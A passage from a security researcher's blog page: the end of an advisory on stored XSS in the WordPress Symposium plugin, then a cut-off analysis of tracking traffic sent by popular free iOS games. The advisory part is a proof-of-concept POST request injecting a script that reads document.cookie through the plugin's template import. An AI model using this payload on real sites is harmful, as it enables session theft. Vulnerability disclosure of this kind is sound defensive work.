						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa8cac562410308-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_ajax_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8cac562410308-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c98e7aa8cac562410308-3"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8cac562410308-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">167</span></div><div class="crayon-line" id="crayon-53c98e7aa8cac562410308-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa8cac562410308-6"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">import_template_file</span><span class="crayon-o">&amp;</span><span class="crayon-v">import_file</span><span class="crayon-o">=</span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-e">template_forum_header</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-ta">&lt;script&gt;</span><span class="crayon-r">alert</span><span class="crayon-sy">(</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-i">cookie</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-ta">&lt;/script&gt;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">&lt;</span><span class="crayon-o">!</span><span class="crayon-o">--</span><span class="crayon-h"> </span><span class="crayon-i">end_template_forum_header</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-o">&gt;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0034 seconds] -->
<p></p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/symposium/" rel="tag">Symposium</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/25/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities/#respond" title="Comment on WordPress Symposium plugin multiple stored XSS vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-26 -->

				
					
<article id="post-66" class="post-66 post type-post status-publish format-standard hentry category-privacy tag-ios tag-privacy">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/21/analysis-of-ios-games-tracking-traffic/" title="8:16 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-21T20:16:42+00:00" pubdate>July 21, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/21/analysis-of-ios-games-tracking-traffic/" title="Permalink to Analysis of iOS Games tracking traffic" rel="bookmark">Analysis of iOS Games tracking traffic</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p>Introduction<br />
A little while ago, I spent a weekend analyzing a wide cross-section of applications from the iOS app store across all categories. You can read that right <a href="https://charlieeriksen.github.io/2012/07/16/overview-of-ios-tracking-traffic/">here</a>. One specific topic that I had comments and questions about specifically was the games. The iPad, as an example, is not a bad gaming platform. And I know a lot of people who play free iPad games, and let their kids play them. So I figured I&#8217;d do a bit of a bigger dive into that specific category of applications and see what sort of information they track about you and your device.</p>
<p>I downloaded the top 25 applications on the games section of the iOS application store as of July 20th, 19:00 GMT. The list goes as following, with the number of outbound connections to different sites the application makes:</p>
<ul>
<li>Fish with Attitude            14</li>
<li>CSR Racing                          8</li>
<li>Water? Free                        7</li>
<li>Battle Bears Royale         6</li>
<li>Ice Age Village                  5</li>
<li>Mutant Roadkill                5</li>
<li>Angry Birds Space Free 4</li>
<li>Fix-It Felix                          4</li>
<li>Shark Dash                           4</li>
<li>The Sandbox                       4</li>
<li>Flick Kick Football           3</li>
<li>Magic Puzzles                     3</li>
<li>SongPop Free                     3</li>
<li>Flow                                       3</li>
<li>Arms Cartel                        2</li>
<li>Betrayal HD                        2</li>
<li>My School Dance             2</li>
<li>Pyramid Run                     2</li>
<li>Super Pretzle Factory   2</li>
<li>Temple Run                       2</li>
<li>Bakery Store                     1</li>
<li>Bubble Mania                   1</li>
<li>Guess!                                  1</li>
<li>Subway Surf                     1</li>
<li>Major Mayhem               0</li>
</ul>
<p><strong>Stats<br />
</strong>Here are some quick stats:</p>
<ul>
<li>25 applications</li>
<li>48 different urls were used to track different information about the device</li>
<li>The application to communicate with the most servers was Fish with Attitude, talking to 14 different sites</li>
<li>The application to communicate with the least servers was Major Mayhem, being the only to not send any tracking information about the device</li>
<li>11 of the servers were contacted over HTTPS (23%)</li>
<li>37 of the servers were contacted over HTTP (77%)</li>
</ul>
<p><strong>Tracking sites top 10</strong><br />
Here is the top 10 of the different URLs that were observed to track information about the device:</p>
<p>- http://data.flurry.com                         15<br />
- https://www.chartboost.com              9<br />
- http://req.appads.com                           4<br />
- https://ws.tapjoyads.com                     4<br />
- http://e.apsalar.com                               3<br />
- http://api2.playhaven.com                  3<br />
- http://livewebapp.gameloft.com       2<br />
- https://api.openfeint.com                     2<br />
- http://googleads.g.doubleclick.net   2<br />
- http://blog.analytics.tapulous.com  2</p>
<p>As we can see, there are a lot of similarities between this data and that of the <a href="https://charlieeriksen.github.io/2012/07/16/overview-of-ios-tracking-traffic/">Overview of iOS tracking traffic</a> analysis. Flurry, Chartboost, and Tapjoy are again back, being extremely popular. Please see the previous article for analysis of the requests made by these.</p>
<p><strong>Analysis of the other sites</strong><br />
Between the top 10 sites as listed above, here is what is being tracked by them.</p>
<ul>
<li>Specific events in the game</li>
<li>OS version</li>
<li>Device version</li>
<li>Mac Address</li>
<li>Local IP Address</li>
<li>Mobile carrier</li>
<li>Unique identifiers</li>
<li>Radio type (WiFi or 3G)</li>
<li>Timezone</li>
<li>OS locale</li>
<li>Application identifier</li>
<li>Application version</li>
<li>Screen resolution and orientation</li>
<li>Time stamp</li>
</ul>
<p><strong>The big pictures</strong><br />
<a href="https://charlieeriksen.github.io/wp-content/uploads/2012/07/iosGames.png"><img class="alignnone size-medium wp-image-68" title="iOS games requests" src="https://charlieeriksen.github.io/wp-content/uploads/2012/07/iosGames-300x205.png" alt="" width="300" height="205" /></a><a href="https://charlieeriksen.github.io/wp-content/uploads/2012/07/iosGames2.png"><img class="alignnone size-medium wp-image-69" title="iOS games requests" src="https://charlieeriksen.github.io/wp-content/uploads/2012/07/iosGames2-300x210.png" alt="" width="300" height="210" /></a></p>
<p><strong>appads.com</strong><br />
appads.com is owned by the company &#8220;Burstly&#8221;. It is used for developers to sell applications to be shown in their applications. It communicates over plain HTTP, and will track a lot of different values about your device.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9a49676820089" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /Services/PubAd.svc/GetSingleAdPlacement HTTP/1.1
Host: neptune.appads.com
User-Agent: AngryBirdsSpace-iPad-Free/1.2.2 CFNetwork/548.1.4 Darwin/11.0.0
Content-Length: 824
Content-Type: text/json
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: keep-alive
Proxy-Connection: keep-alive

{"data":{"noTrack":"0","cookie":[],"userAgentInfo":{"MCC":0,"MNC":0,"webUserAgent":"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B206","Platform":"iOS","Carrier":"","v":"3","Device":"iPad1,1","PlatformVersion":"5.1.1","Build":"1.33.0.8787","DeviceFamily":"iPad"},"adSizes":["320x48","320x24","300x50","250x50","320x480"],"publisher":"tbhsxn_COUae_hbXSL04Xw","openUDID":"63d47693b3b0914eb52e8eecfeb90e4c346533af","type":"iq","userAgent":"iOS;iPad;5.1.1;1.33.0.8787","debugFlags":"0","bundleId":"com.rovio.com.rovio.AngryBirdsSpaceFreeHD","placement":"","encMAC":"YUHqJ9lQP4eDblJZoOlHlVS9xZoNmJhFVivWQl8bc2M=","ipAddress":"","cct":0,"clientDateTime":"6,1636","mac":"8e4a57d622ba39867acd46bb7bbbbe7e37707c08","Id":"9B9E36C6","adPool":"0","zone":"0356126469155294614","rvCR":""}}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9a49676820089-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a49676820089-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9a49676820089-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a49676820089-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9a49676820089-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a49676820089-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9a49676820089-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a49676820089-8">8</div><div class="crayon-num" data-line="crayon-53c98e7aa9a49676820089-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a49676820089-10">10</div><div class="crayon-num" data-line="crayon-53c98e7aa9a49676820089-11">11</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9a49676820089-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">Services</span><span class="crayon-o">/</span><span class="crayon-v">PubAd</span><span class="crayon-sy">.</span><span class="crayon-i">svc</span><span class="crayon-o">/</span><span class="crayon-e">GetSingleAdPlacement </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a49676820089-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">neptune</span><span class="crayon-sy">.</span><span class="crayon-v">appads</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9a49676820089-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">AngryBirdsSpace</span><span class="crayon-o">-</span><span class="crayon-i">iPad</span><span class="crayon-o">-</span><span class="crayon-i">Free</span><span class="crayon-o">/</span><span class="crayon-cn">1.2.2</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a49676820089-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">824</span></div><div class="crayon-line" id="crayon-53c98e7aa9a49676820089-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">text</span><span class="crayon-o">/</span><span class="crayon-e">json</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a49676820089-6"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9a49676820089-7"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a49676820089-8"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line" id="crayon-53c98e7aa9a49676820089-9"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-e">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a49676820089-10">&nbsp;</div><div class="crayon-line" id="crayon-53c98e7aa9a49676820089-11"><span class="crayon-sy">{</span><span class="crayon-s">"data"</span><span class="crayon-o">:</span><span class="crayon-sy">{</span><span class="crayon-s">"noTrack"</span><span class="crayon-o">:</span><span class="crayon-s">"0"</span><span class="crayon-sy">,</span><span class="crayon-s">"cookie"</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-s">"userAgentInfo"</span><span class="crayon-o">:</span><span class="crayon-sy">{</span><span class="crayon-s">"MCC"</span><span class="crayon-o">:</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-s">"MNC"</span><span class="crayon-o">:</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-s">"webUserAgent"</span><span class="crayon-o">:</span><span class="crayon-s">"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B206"</span><span class="crayon-sy">,</span><span class="crayon-s">"Platform"</span><span class="crayon-o">:</span><span class="crayon-s">"iOS"</span><span class="crayon-sy">,</span><span class="crayon-s">"Carrier"</span><span class="crayon-o">:</span><span class="crayon-s">""</span><span class="crayon-sy">,</span><span class="crayon-s">"v"</span><span class="crayon-o">:</span><span class="crayon-s">"3"</span><span class="crayon-sy">,</span><span class="crayon-s">"Device"</span><span class="crayon-o">:</span><span class="crayon-s">"iPad1,1"</span><span class="crayon-sy">,</span><span class="crayon-s">"PlatformVersion"</span><span class="crayon-o">:</span><span class="crayon-s">"5.1.1"</span><span class="crayon-sy">,</span><span class="crayon-s">"Build"</span><span class="crayon-o">:</span><span class="crayon-s">"1.33.0.8787"</span><span class="crayon-sy">,</span><span class="crayon-s">"DeviceFamily"</span><span class="crayon-o">:</span><span class="crayon-s">"iPad"</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span><span class="crayon-s">"adSizes"</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-s">"320x48"</span><span class="crayon-sy">,</span><span class="crayon-s">"320x24"</span><span class="crayon-sy">,</span><span class="crayon-s">"300x50"</span><span class="crayon-sy">,</span><span class="crayon-s">"250x50"</span><span class="crayon-sy">,</span><span class="crayon-s">"320x480"</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-s">"publisher"</span><span class="crayon-o">:</span><span class="crayon-s">"tbhsxn_COUae_hbXSL04Xw"</span><span class="crayon-sy">,</span><span class="crayon-s">"openUDID"</span><span class="crayon-o">:</span><span class="crayon-s">"63d47693b3b0914eb52e8eecfeb90e4c346533af"</span><span class="crayon-sy">,</span><span class="crayon-s">"type"</span><span class="crayon-o">:</span><span class="crayon-s">"iq"</span><span class="crayon-sy">,</span><span class="crayon-s">"userAgent"</span><span class="crayon-o">:</span><span class="crayon-s">"iOS;iPad;5.1.1;1.33.0.8787"</span><span class="crayon-sy">,</span><span class="crayon-s">"debugFlags"</span><span class="crayon-o">:</span><span class="crayon-s">"0"</span><span class="crayon-sy">,</span><span class="crayon-s">"bundleId"</span><span class="crayon-o">:</span><span class="crayon-s">"com.rovio.com.rovio.AngryBirdsSpaceFreeHD"</span><span class="crayon-sy">,</span><span class="crayon-s">"placement"</span><span class="crayon-o">:</span><span class="crayon-s">""</span><span class="crayon-sy">,</span><span class="crayon-s">"encMAC"</span><span class="crayon-o">:</span><span class="crayon-s">"YUHqJ9lQP4eDblJZoOlHlVS9xZoNmJhFVivWQl8bc2M="</span><span class="crayon-sy">,</span><span class="crayon-s">"ipAddress"</span><span class="crayon-o">:</span><span class="crayon-s">""</span><span class="crayon-sy">,</span><span class="crayon-s">"cct"</span><span class="crayon-o">:</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-s">"clientDateTime"</span><span class="crayon-o">:</span><span class="crayon-s">"6,1636"</span><span class="crayon-sy">,</span><span class="crayon-s">"mac"</span><span class="crayon-o">:</span><span class="crayon-s">"8e4a57d622ba39867acd46bb7bbbbe7e37707c08"</span><span class="crayon-sy">,</span><span class="crayon-s">"Id"</span><span class="crayon-o">:</span><span class="crayon-s">"9B9E36C6"</span><span class="crayon-sy">,</span><span class="crayon-s">"adPool"</span><span class="crayon-o">:</span><span class="crayon-s">"0"</span><span class="crayon-sy">,</span><span class="crayon-s">"zone"</span><span class="crayon-o">:</span><span class="crayon-s">"0356126469155294614"</span><span class="crayon-sy">,</span><span class="crayon-s">"rvCR"</span><span class="crayon-o">:</span><span class="crayon-s">""</span><span class="crayon-sy">}</span><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0079 seconds] -->
<p></p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9a5b892902951" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
GET /scripts/ConfirmDownload.aspx?bundleId=com.rovio.com.rovio.AngryBirdsSpaceFreeHD&amp;version=1.2.2&amp;distribution=true&amp;host=sdk&amp;token=37df1c2a7a680b8ff80b75217440839cf63a4de3&amp;timeStamp=1342827362&amp;platform=IPHONE&amp;mac=8e4a57d622ba39867acd46bb7bbbbe7e37707c08&amp;encMAC=YUHqJ9lQP4eDblJZoOlHlVS9xZoNmJhFVivWQl8bc2M%3D&amp;openUDID=63d47693b3b0914eb52e8eecfeb90e4c346533af HTTP/1.1
Host: req.appads.com
User-Agent: AngryBirdsSpace-iPad-Free/1.2.2 CFNetwork/548.1.4 Darwin/11.0.0
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: keep-alive
Proxy-Connection: keep-alive</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c98e7aa9a5b892902951-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a5b892902951-2">2</div><div class="crayon-num" data-line="crayon-53c98e7aa9a5b892902951-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a5b892902951-4">4</div><div class="crayon-num" data-line="crayon-53c98e7aa9a5b892902951-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c98e7aa9a5b892902951-6">6</div><div class="crayon-num" data-line="crayon-53c98e7aa9a5b892902951-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c98e7aa9a5b892902951-1"><span class="crayon-i">GET</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">scripts</span><span class="crayon-o">/</span><span class="crayon-v">ConfirmDownload</span><span class="crayon-sy">.</span><span class="crayon-i">aspx</span><span class="crayon-sy">?</span><span class="crayon-v">bundleId</span><span class="crayon-o">=</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">rovio</span><span class="crayon-sy">.</span><span class="crayon-v">com</span><span class="crayon-sy">.</span><span class="crayon-v">rovio</span><span class="crayon-sy">.</span><span class="crayon-i">AngryBirdsSpaceFreeHD</span><span class="crayon-o">&amp;</span><span class="crayon-v">version</span><span class="crayon-o">=</span><span class="crayon-cn">1.2.2</span><span class="crayon-o">&amp;</span><span class="crayon-v">distribution</span><span class="crayon-o">=</span><span class="crayon-t">true</span><span class="crayon-o">&amp;</span><span class="crayon-v">host</span><span class="crayon-o">=</span><span class="crayon-i">sdk</span><span class="crayon-o">&amp;</span><span class="crayon-v">token</span><span class="crayon-o">=</span><span class="crayon-cn">37df1c2a7a680b8ff80b75217440839cf63a4de3</span><span class="crayon-o">&amp;</span><span class="crayon-v">timeStamp</span><span class="crayon-o">=</span><span class="crayon-cn">1342827362</span><span class="crayon-o">&amp;</span><span class="crayon-v">platform</span><span class="crayon-o">=</span><span class="crayon-i">IPHONE</span><span class="crayon-o">&amp;</span><span class="crayon-v">mac</span><span class="crayon-o">=</span><span class="crayon-cn">8e4a57d622ba39867acd46bb7bbbbe7e37707c08</span><span class="crayon-o">&amp;</span><span class="crayon-v">encMAC</span><span class="crayon-o">=</span><span class="crayon-i">YUHqJ9lQP4eDblJZoOlHlVS9xZoNmJhFVivWQl8bc2M</span><span class="crayon-o">%</span><span class="crayon-cn">3D</span><span class="crayon-o">&amp;</span><span class="crayon-v">openUDID</span><span class="crayon-o">=</span><span class="crayon-cn">63d47693b3b0914eb52e8eecfeb90e4c346533af</span><span class="crayon-h"> </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a5b892902951-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">req</span><span class="crayon-sy">.</span><span class="crayon-v">appads</span><span class="crayon-sy">.</span><span class="crayon-e">com</span></div><div class="crayon-line" id="crayon-53c98e7aa9a5b892902951-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">AngryBirdsSpace</span><span class="crayon-o">-</span><span class="crayon-i">iPad</span><span class="crayon-o">-</span><span class="crayon-i">Free</span><span class="crayon-o">/</span><span class="crayon-cn">1.2.2</span><span class="crayon-h"> </span><span class="crayon-i">CFNetwork</span><span class="crayon-o">/</span><span class="crayon-cn">548.1.4</span><span class="crayon-h"> </span><span class="crayon-i">Darwin</span><span class="crayon-o">/</span><span class="crayon-cn">11.0.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a5b892902951-4"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Language</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">en</span><span class="crayon-o">-</span><span class="crayon-e">us</span></div><div class="crayon-line" id="crayon-53c98e7aa9a5b892902951-5"><span class="crayon-i">Accept</span><span class="crayon-o">-</span><span class="crayon-i">Encoding</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">gzip</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">deflate</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c98e7aa9a5b892902951-6"><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-e">alive</span></div><div class="crayon-line" id="crayon-53c98e7aa9a5b892902951-7"><span class="crayon-i">Proxy</span><span class="crayon-o">-</span><span class="crayon-i">Connection</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">keep</span><span class="crayon-o">-</span><span class="crayon-i">alive</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0048 seconds] -->
<p>There are two hashed/encrypted fields, seemingly being related to the mac address of the device. Also it seems to be carrying across, or at least have keys allocated for, the IP address and carrier of the device. Neither were sent across for my device, possibly because it&#8217;s a WiFi iPad. But I found that very interesting. Beyond that:</p>
<ul>
<li>Platform</li>
<li>Carrier</li>
<li>Device type</li>
<li>OS Version</li>
<li>OS Locale</li>
<li>Screen resolution</li>
<li>Application build</li>
<li>Device Family</li>
<li>Unique Identifier</li>
<li>Application identifier</li>
<li>Location country</li>
<li>Radio type (WiFi/3G)</li>
<li>encMAC(Encrypted mac?)</li>
<li>IP Address</li>
<li>mac(Hashed mac address?)</li>
</ul>
<p>e.apsalar.com<br />
Apsalar is a &#8220;mobile app analytics&#8221; platform, specifically focused as measuring &#8220;engagement&#8221;. It communicates over HTTP as well, and is very chatty. For instance, Battle Bears Royal made 13 requests over a period of 9 seconds. It specifically will also call back on specific events, such as game opened and other developer-specified events.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c98e7aa9a66827928201" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
